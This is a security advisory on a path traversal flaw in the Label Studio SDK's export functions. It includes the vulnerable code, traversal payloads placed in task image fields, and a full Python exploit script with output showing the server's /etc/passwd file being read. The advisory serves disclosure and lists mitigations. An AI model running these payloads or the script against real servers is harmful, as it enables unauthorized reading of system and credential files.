summary: "Label Studio has a Path Traversal Vulnerability via image Field\n## Description\n\
  A path traversal vulnerability in Label Studio SDK versions prior to 1.0.10 allows unauthorized\
  \ file access outside the intended directory structure. Label Studio versions before 1.16.0\
  \ specified SDK versions prior to 1.0.10 as dependencies, and the issue was confirmed in Label\
  \ Studio version 1.13.2.dev0; therefore, Label Studio users should upgrade to 1.16.0 or newer\
  \ to mitigate it. The flaw exists in the VOC, COCO and YOLO export functionalites. These functions\
  \ invoke a `download` function on the `label-studio-sdk` python package, which fails to validate\
  \ file paths when processing image references during task exports:\n\n```python\ndef download(\n\
  \    url,\n    output_dir,\n    filename=None,\n    project_dir=None,\n    return_relative_path=False,\n\
  \    upload_dir=None,\n    download_resources=True,\n):\n    is_local_file = url.startswith(\"\
  /data/\") and \"?d=\" in url\n    is_uploaded_file = url.startswith(\"/data/upload\")\n\n\
  \    if is_uploaded_file:\n        upload_dir = _get_upload_dir(project_dir, upload_dir)\n\
  \        filename = urllib.parse.unquote(url.replace(\"/data/upload/\", \"\"))\n        filepath\
  \ = os.path.join(upload_dir, filename)\n        logger.debug(\n            f\"Copy {filepath}\
  \ to {output_dir}\".format(\n                filepath=filepath, output_dir=output_dir\n  \
  \          )\n        )\n        if download_resources:\n            shutil.copy(filepath,\
  \ output_dir)\n        if return_relative_path:\n            return os.path.join(\n      \
  \          os.path.basename(output_dir), os.path.basename(filename)\n            )\n     \
  \   return filepath\n\n    if is_local_file:\n        filename, dir_path = url.split(\"/data/\"\
  , 1)[-1].split(\"?d=\")\n        dir_path = str(urllib.parse.unquote(dir_path))\n        filepath\
  \ = os.path.join(LOCAL_FILES_DOCUMENT_ROOT, dir_path)\n        if not os.path.exists(filepath):\n\
  \            raise FileNotFoundError(filepath)\n        if download_resources:\n         \
  \   shutil.copy(filepath, output_dir)\n        return filepath\n```\n\nBy creating tasks with\
  \ path traversal sequences in the image field, an attacker can force the application to read\
  \ files from arbitrary server filesystem locations when exporting projects in any of the mentioned\
  \ formats.\n\nNote that there are two different possible code paths leading to this result,\
  \ one for the `is_uploaded_file` and another one for the `is_local_file`.\n\n## Steps to Reproduce\n\
  1. Login to Label Studio\n2. Create project with image labeling configuration\n3. If the `data/media/upload`\
  \ directory doesn't exists yet, upload an image to force the server to create it\n4. Create\
  \ task with path traversal in image field\n   \n    4.1. To trigger the `is_uploaded_file`\
  \ code path:\n   ```json\n   {\n     \"data\": {\n       \"text\": \"test\",\n       \"image\"\
  : \"/data/upload/../../../../../etc/passwd\"\n     }\n   }\n   ```\n    4.2. To trigger the\
  \ `is_local_file` code path:\n   ```json\n   {\n     \"data\": {\n       \"text\": \"test\"\
  ,\n       \"image\": \"/data/local-files/?d=../../../etc/passwd\"\n     }\n   }\n   ```\n\
  6. Export project using VOC, YOLO or COCO formats. The server will return a Zip file in any\
  \ of the three cases, for example:\n   ```\n   GET /api/projects/1/export?exportType=VOC&download_all_tasks=true&download_resources=true\n\
  \   ```\n7. Download the generated Zip file. The server's /etc/passwd file will be at `images/passwd`\
  \ on the Zip file.\n\n\nAlternatively, use the following exploit code, updating the `BASE_URL`,\
  \ `USERNAME` and `PASSWORD` variables. Please note that the code will attempt to create a\
  \ new user, but if the user exists and the credentials are valid, it will still work. Modify\
  \ `METHOD` and `EXPORT_TYPE` to test the different code paths and export formats:\n\n```python\n\
  import requests\nfrom bs4 import BeautifulSoup\nimport io\nimport zipfile\n\n\nBASE_URL =\
  \ \"http://xbow-app-1:8000\"\nUSERNAME = \"test@test.com\"\nPASSWORD = \"Test123!@#\"\nMETHOD\
  \ = \"is_uploaded_file\" # Valid values: \"is_uploaded_file\" or \"is_local_file\"\nEXPORT_TYPE\
  \ = \"VOC\"         # Valid values: \"VOC\", \"COCO\" or \"YOLO\"\n\nprint(\"Signing up...\"\
  )\nurl = \"%s/user/signup/\" % BASE_URL\nsession = requests.Session()\n\n# First get the CSRF\
  \ token\nresponse = session.get(url)\nsoup = BeautifulSoup(response.text, 'html.parser')\n\
  csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']\nprint(f\"Got CSRF\
  \ token: {csrf_token}\")\n\n# Prepare registration data\ndata = {\n    'csrfmiddlewaretoken':\
  \ csrf_token,\n    'email': USERNAME,\n    'password': PASSWORD,\n    'allow_newsletters':\
  \ 'false',\n    'allow_newsletters_visual': 'false'\n}\n\nheaders = {\n    'Referer': url,\n\
  \    'Content-Type': 'application/x-www-form-urlencoded',\n}\n\n# Submit the registration\
  \ request\nresponse = session.post(url, data=data, headers=headers)\nprint(f\"User registration\
  \ response status code: {response.status_code}\\n\")\n\n# Login\nprint(\"Logging in...\")\n\
  url = \"%s/user/login\" % BASE_URL\n\n# Attempt login with our credentials\nlogin_data = {\n\
  \    'csrfmiddlewaretoken': csrf_token,\n    'email': USERNAME,\n    'password': PASSWORD,\n\
  }\n\nheaders = {\n    'Referer': url,\n    'Content-Type': 'application/x-www-form-urlencoded',\n\
  }\n\nresponse = session.post(url, data=login_data, headers=headers)\n\nprint(f\"Login response\
  \ status code: {response.status_code}\")\n\n# Check if we got any tokens in the response\n\
  print(\"\\nCookies after login:\")\nfor cookie in session.cookies:\n    print(f\"{cookie.name}:\
  \ {cookie.value}\")\n\n\n# We will use these headers moving forward\nheaders = {\n    'Content-Type':\
  \ 'application/json',\n    'X-CSRFToken': session.cookies['csrftoken']\n}\n\n# Creat a project\
  \ to then create a task associated to it\nprint(\"\\nCreating project...\")\n# Try to create\
  \ a project with a file upload configuration\nproject_data = {\n    \"title\": \"File Upload\
  \ Test\",\n    \"description\": \"Testing file upload functionality\",\n    \"label_config\"\
  : \"\"\"\n    <View>\n      <Image name=\"image\" value=\"$image\"/>\n      <Text name=\"\
  text\" value=\"$text\"/>\n      <Choices name=\"choice\" toName=\"image\">\n        <Choice\
  \ value=\"yes\"/>\n        <Choice value=\"no\"/>\n      </Choices>\n    </View>\n    \"\"\
  \"\n}\nresponse = session.post(\"%s/api/projects/\" % BASE_URL, json=project_data, headers=headers)\n\
  if response.status_code != 201:\n    print(\"Problem creating project, aborting\")\n    exit(0)\
  \    \nproject_id = response.json()['id']\nprint(f\"Project ID: {project_id}\\n\")\n\n# Create\
  \ task using a filename to later abuse a path traversal vulnerability during file export\n\
  print(f\"Creating task with method {METHOD} (defaults to is_local_file)...\")\ntask_data =\
  \ {}\nif (METHOD == \"is_uploaded_file\"):\n    task_data[\"data\"] = {\n            \"text\"\
  : \"test\",\n            \"image\": \"/data/upload/../../../../../etc/passwd\"    # Trigger\
  \ for is_uploaded_file\n    }\nelse:\n    task_data[\"data\"] = {\n            \"text\": \"\
  test\",\n            \"image\": \"/data/local-files/?d=../../../etc/passwd\" # Trigger for\
  \ is_local_file\n    }\nresponse = session.post(f\"{BASE_URL}/api/projects/{project_id}/tasks\"\
  , json=task_data, headers=headers)\nif response.status_code != 201:\n    print(\"Problem creating\
  \ task, aborting\")\n    exit(0)    \ntask_id = response.json()['id']\nprint(f\"Task created\
  \ successfully, task id: {task_id}\\n\")\n\n# Issue a dummy upload request to force the creation\
  \ of the ~/data/images/upload folder\nresponse = session.post(f\"{BASE_URL}/api/projects/{project_id}/import?commit_to_project=false\"\
  , files={\"bar.png\":\"data\"})\n\n# Request the server to generate a zip with all of the\
  \ project information and files (works for YOLO, COCO or VOC)\nresponse = session.get(f\"\
  {BASE_URL}/api/projects/{project_id}/export?exportType={EXPORT_TYPE}&download_all_tasks=true&download_resources=true\"\
  )\nif (response.status_code != 200):\n    print(\"Couldn't fetch export file\")\n    exit(0)\n\
  \nfile_like_object = io.BytesIO(response.content)\nzipfile_ob = zipfile.ZipFile(file_like_object)\n\
  print(\"Dumping /etc/passwd file contents:\")\nprint(zipfile_ob.read(\"images/passwd\").decode(\"\
  utf-8\"))\n\n```\n\nOutput:\n\n```\n$ python3 studio-min.py\nSigning up...\nGot CSRF token:\
  \ CQXYq1qbQ5jMG2FjQfzodC3i6weiIMq9T6lqhBQLT94sbcLKOg0ZeZxep7hPKLM6\nUser registration response\
  \ status code: 200\n\nLogging in...\nLogin response status code: 200\n\nCookies after login:\n\
  csrftoken: PsEKLHstcGIXDFCP3OGQGCwKUFOdlN33\nsessionid: .eJxVj8tyhSAQRP-FtVrIQ8Dl3ecbqAEGNRqwRKvyqPx7JHUXyXKme7rnfJFrCWQkTDHlpYit1jq2AiVrgQpoqZYATvSMu540JB8TpOUTziUnu69k7BuyQTntlqcl3aPiSklquOoUZ7pnoiEWrnO2V8HD_lbVnD87B37FVIXwCmnKnc_pPBbXVUv3VEv3kgNuj6f3X8AMZb6vTaQQuaaoghCOBqFMuJ8egjdGGu4oiMCDdkpHGEQMWhoXNUM59D5Q5-_QFXG3b1hhJgy2AkXYCt51BUupzPi-L8cHGen3D57HZCg:1tbQOv:nomwczhhTvAaXMoyRrO30lWR5UkGi7AqiUHKyshQJ30\n\
  \nCreating project...\nProject ID: 10\n\nCreating task with method is_uploaded_file (defaults\
  \ to is_local_file)...\nTask created successfully, task id: 10\n\nDumping /etc/passwd file\
  \ contents:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
  bin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n\
  games:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n\
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n\
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n\
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n\
  irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n\
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n\
  nginx:x:999:999:nginx user:/nonexistent:/usr/sbin/nologin\n```\n\n## Mitigations\n- Validate\
  \ and sanitize file paths\n- Add an allowlist of directories and file types\n- Implement file\
  \ access controls\n- Use randomized file names and secure file storage abstraction\n\n## Impact\n\
  Authentication-required vulnerability allowing arbitrary file reads from the server filesystem.\
  \ Potential exposure of sensitive information like configuration files, credentials, and confidential\
  \ data."
